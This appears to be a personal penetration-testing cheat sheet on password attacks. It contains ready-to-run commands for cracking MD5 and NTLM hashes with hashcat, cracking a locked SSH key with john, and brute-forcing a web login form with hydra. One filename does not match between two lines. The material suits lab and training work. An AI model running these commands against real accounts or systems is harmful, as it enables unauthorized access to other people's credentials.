# Password Attacks

This page is were I'll store all of my password attacking commands and tips. For local hash cracking I'll usually default to Hashcat. Hashcat is going to work best when running on your host machine rather than inside of a VM, especially if your host machine has a video card installed. When utilizing a graphics card Hashcat can be _much_ faster than john the ripper, but there are still some cases where we'll use the tools provided by `john`.

## Wordlists

* [seclists](https://github.com/danielmiessler/SecLists)
* `apt install wordlists`
  - `/usr/share/wordlists/rockyou.txt.gz`

## Hash Cracking

### Unix MD5 Hashes:

```bash
 echo '$1$cVbu7POZ$WB/V36i/G00QKzHkkqWig/' > hashes.txt
 .\hashcat64.exe -o cracked.txt -m 500 .\hashes.txt .\rockyou.txt
 cat cracked.txt
```

### Windows NTLM Hashes:

```bash
echo C5E0002FDE3F5EB2CF5730FFEE58EBCC > hashes.txt
.\hashcat64.exe -o cracked.txt -m 1000 .\hashes.txt .\rockyou.txt
cat cracked.txt
```

### Password Locked Private RSA Key:

This is going to be one of the few times where we use `john`.

```bash
python /usr/share/john/ssh2john.py locked_key.pem > locked_key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash
```

## Web Applications

### HTTP Post Form:

```bash
hydra -P /usr/share/wordlists/nmap.lst -l admin 10.10.10.10 http-post-form "/path/to/login/admin.php:username=^USER^&password=^PASS^:Incorrect"
```

